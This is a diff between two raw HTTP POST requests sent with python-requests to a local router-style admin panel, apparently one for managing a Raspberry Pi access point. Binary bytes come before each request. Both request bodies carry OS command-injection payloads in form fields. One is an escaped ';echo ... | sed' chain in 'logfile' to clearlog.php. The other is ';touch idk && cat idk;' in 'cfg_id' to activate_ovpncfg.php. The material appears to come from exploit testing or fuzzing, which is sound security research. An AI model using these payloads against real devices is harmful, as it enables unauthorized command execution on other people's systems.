@@ -1,22 +1,22 @@
-'º4ScbE´Ë,@@W
+'º4SEdÞ@@Cò
 
-Ps@FW0,ö^(
-«6[0!POST /ajax/logging/clearlog.php HTTP/1.1
+P7f-j	öµê
+«F½<_=POST /ajax/openvpn/activate_ovpncfg.php HTTP/1.1
 
 Host: 10.1.1.1
 
-Content-Length: 150
+User-Agent: python-requests/2.9.1
 
 Accept-Encoding: gzip, deflate
 
-Connection: keep-alive
-
-User-Agent: python-requests/2.9.1
+Content-Length: 63
 
 Accept: */*
+
+Connection: keep-alive
 
 Content-Type: application/x-www-form-urlencoded
 
 
 
-a=%5E%24+d&logfile=%5C%3Becho+%22fuck%22+%5C%7C+sed+%22s%5C%5Cf%5C%5Cd%5C%5C%22%5C%3B&fuck=%25%24%24%25+%26%2A%5E%24%2A%26%5E%24%2A&idk=b+%25%24%23%23
+fuck=&idk=&a=&cfg_id=%5C%3Btouch+idk+%5C%26%5C%26+cat+idk%5C%3B
